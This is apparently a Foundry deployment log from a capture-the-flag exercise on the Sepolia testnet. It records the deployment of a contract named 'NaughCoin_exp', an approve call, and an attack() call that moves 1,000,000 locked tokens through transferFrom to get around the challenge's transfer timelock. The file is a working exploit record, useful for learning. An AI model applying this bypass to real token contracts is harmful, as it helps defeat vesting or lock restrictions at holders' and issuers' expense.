{
  "transactions": [
    {
      "hash": "0xfe886d8cd12d189a2b0f23d3ebbe2a4023b42462f4644b065f38d56420b4104c",
      "transactionType": "CREATE",
      "contractName": "NaughCoin_exp",
      "contractAddress": "0xf555f542fd44c227b664f3856393ca7842a382a6",
      "function": null,
      "arguments": null,
      "transaction": {
        "from": "0x3cee531d7d776d3370484a881be380dea317af9e",
        "gas": "0x57291",
        "value": "0x0",
        "input": "0x608060405234801561001057600080fd5b50610401806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80633c48664c1461003b5780633ccfd60b14610050575b600080fd5b61004e6100493660046102c4565b610058565b005b61004e6101ce565b6040516370a0823160e01b81526001600160a01b03828116600483015283916000918316906370a0823190602401602060405180830381865afa1580156100a3573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100c791906102f7565b90506100f96040518060400160405280600e81526020016d2d95aeb6b9b39739b2b73232b91d60911b815250336101fd565b6101296040518060400160405280600e81526020016d2d95aeb6b9b39739b2b73232b91d60911b815250846101fd565b61014e604051806040016040528060038152602001625b2b5d60e81b81525082610246565b6040516323b872dd60e01b81526001600160a01b038481166004830152306024830152604482018390528316906323b872dd906064016020604051808303816000875af11580156101a3573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101c79190610310565b5050505050565b60405133904780156108fc02916000818181858888f193505050501580156101fa573d6000803e3d6000fd5b50565b610242828260405160240161021392919061037f565b60408051601f198184030181529190526020810180516001600160e01b031663319af33360e01b179052610287565b5050565b610242828260405160240161025c9291906103a9565b60408051601f198184030181529190526020810180516001600160e01b03166309710a9d60e41b1790525b80516a636f6e736f6c652e6c6f67602083016000808483855afa5050505050565b80356001600160a01b03811681146102bf57600080fd5b919050565b600080604083850312156102d757600080fd5b6102e0836102a8565b91506102ee602084016102a8565b90509250929050565b60006020828403121561030957600080fd5b5051919050565b60006020828403121561032257600080fd5b8151801515811461033257600080fd5b9392505050565b6000815180845260005b8181101561035f57602081850181015186830182015201610343565b506000602082860101526020601f19601f83011685010191505092915050565b6040815260006103926040830185610339565b905060018060a01b03831660208301529392505050565b6040815260006103bc6040830185610339565b9050826020830152939250505056fea26469706673582212208cf790aa04b4c43c70553f56b5d1d7c1032c5780acc7684ee09a9c35655d5f1764736f6c63430008140033",
        "nonce": "0xae",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0xfe9d7f68720716efd94c568cf346323d86dedf153e3845f0ecacaa3b066c9cb1",
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xd19251185706b0e80124b7fa107956a594a015bf",
      "function": "approve(address,uint256)",
      "arguments": [
        "0xF555F542fd44c227b664F3856393ca7842A382a6",
        "1000000000000000000000000"
      ],
      "transaction": {
        "from": "0x3cee531d7d776d3370484a881be380dea317af9e",
        "to": "0xd19251185706b0e80124b7fa107956a594a015bf",
        "gas": "0xf9c8",
        "value": "0x0",
        "input": "0x095ea7b3000000000000000000000000f555f542fd44c227b664f3856393ca7842a382a600000000000000000000000000000000000000000000d3c21bcecceda1000000",
        "nonce": "0xaf",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0xc456374e7aa385ff13c7445cf8a7d2b935b9d735cf71e4e06e1060b5dbddf291",
      "transactionType": "CALL",
      "contractName": "NaughCoin_exp",
      "contractAddress": "0xf555f542fd44c227b664f3856393ca7842a382a6",
      "function": "attack(address,address)",
      "arguments": [
        "0xd19251185706b0E80124b7FA107956A594A015BF",
        "0x3CeE531D7d776D3370484A881bE380dEa317af9e"
      ],
      "transaction": {
        "from": "0x3cee531d7d776d3370484a881be380dea317af9e",
        "to": "0xf555f542fd44c227b664f3856393ca7842a382a6",
        "gas": "0x14e2f",
        "value": "0x0",
        "input": "0x3c48664c000000000000000000000000d19251185706b0e80124b7fa107956a594a015bf0000000000000000000000003cee531d7d776d3370484a881be380dea317af9e",
        "nonce": "0xb0",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    }
  ],
  "receipts": [
    {
      "status": "0x1",
      "cumulativeGasUsed": "0xc810b4",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0xfe886d8cd12d189a2b0f23d3ebbe2a4023b42462f4644b065f38d56420b4104c",
      "transactionIndex": "0x3f",
      "blockHash": "0x4b50f440ec394fcff9d37add48a35a516fc64ba92e712deeffcfd92b9c10d2ac",
      "blockNumber": "0x699bcc",
      "gasUsed": "0x43103",
      "effectiveGasPrice": "0x7b8bad614",
      "from": "0x3cee531d7d776d3370484a881be380dea317af9e",
      "to": null,
      "contractAddress": "0xf555f542fd44c227b664f3856393ca7842a382a6"
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0xc8c58b",
      "logs": [
        {
          "address": "0xd19251185706b0e80124b7fa107956a594a015bf",
          "topics": [
            "0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925",
            "0x0000000000000000000000003cee531d7d776d3370484a881be380dea317af9e",
            "0x000000000000000000000000f555f542fd44c227b664f3856393ca7842a382a6"
          ],
          "data": "0x00000000000000000000000000000000000000000000d3c21bcecceda1000000",
          "blockHash": "0x4b50f440ec394fcff9d37add48a35a516fc64ba92e712deeffcfd92b9c10d2ac",
          "blockNumber": "0x699bcc",
          "transactionHash": "0xfe9d7f68720716efd94c568cf346323d86dedf153e3845f0ecacaa3b066c9cb1",
          "transactionIndex": "0x40",
          "logIndex": "0x97",
          "removed": false
        }
      ],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000200000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000800000000000000000000000010000000000000000001000000000000000000000040000000000000000000000200000020000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000100000",
      "type": "0x2",
      "transactionHash": "0xfe9d7f68720716efd94c568cf346323d86dedf153e3845f0ecacaa3b066c9cb1",
      "transactionIndex": "0x40",
      "blockHash": "0x4b50f440ec394fcff9d37add48a35a516fc64ba92e712deeffcfd92b9c10d2ac",
      "blockNumber": "0x699bcc",
      "gasUsed": "0xb4d7",
      "effectiveGasPrice": "0x7b8bad614",
      "from": "0x3cee531d7d776d3370484a881be380dea317af9e",
      "to": "0xd19251185706b0e80124b7fa107956a594a015bf",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0xc9aa0c",
      "logs": [
        {
          "address": "0xd19251185706b0e80124b7fa107956a594a015bf",
          "topics": [
            "0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925",
            "0x0000000000000000000000003cee531d7d776d3370484a881be380dea317af9e",
            "0x000000000000000000000000f555f542fd44c227b664f3856393ca7842a382a6"
          ],
          "data": "0x0000000000000000000000000000000000000000000000000000000000000000",
          "blockHash": "0x4b50f440ec394fcff9d37add48a35a516fc64ba92e712deeffcfd92b9c10d2ac",
          "blockNumber": "0x699bcc",
          "transactionHash": "0xc456374e7aa385ff13c7445cf8a7d2b935b9d735cf71e4e06e1060b5dbddf291",
          "transactionIndex": "0x41",
          "logIndex": "0x98",
          "removed": false
        },
        {
          "address": "0xd19251185706b0e80124b7fa107956a594a015bf",
          "topics": [
            "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
            "0x0000000000000000000000003cee531d7d776d3370484a881be380dea317af9e",
            "0x000000000000000000000000f555f542fd44c227b664f3856393ca7842a382a6"
          ],
          "data": "0x00000000000000000000000000000000000000000000d3c21bcecceda1000000",
          "blockHash": "0x4b50f440ec394fcff9d37add48a35a516fc64ba92e712deeffcfd92b9c10d2ac",
          "blockNumber": "0x699bcc",
          "transactionHash": "0xc456374e7aa385ff13c7445cf8a7d2b935b9d735cf71e4e06e1060b5dbddf291",
          "transactionIndex": "0x41",
          "logIndex": "0x99",
          "removed": false
        }
      ],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000200000000000000000000000000008000000000000000008000000000000000000000000000000000000000000000000000000800000000000000000000010010000000000000000001000000000000000000000040000000000000000000000200000020000000000000000000000000000000000000000000000000000000000000001000002000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000100000",
      "type": "0x2",
      "transactionHash": "0xc456374e7aa385ff13c7445cf8a7d2b935b9d735cf71e4e06e1060b5dbddf291",
      "transactionIndex": "0x41",
      "blockHash": "0x4b50f440ec394fcff9d37add48a35a516fc64ba92e712deeffcfd92b9c10d2ac",
      "blockNumber": "0x699bcc",
      "gasUsed": "0xe481",
      "effectiveGasPrice": "0x7b8bad614",
      "from": "0x3cee531d7d776d3370484a881be380dea317af9e",
      "to": "0xf555f542fd44c227b664f3856393ca7842a382a6",
      "contractAddress": null
    }
  ],
  "libraries": [],
  "pending": [],
  "returns": {},
  "timestamp": 1729579659,
  "chain": 11155111,
  "commit": "d1bf55a"
}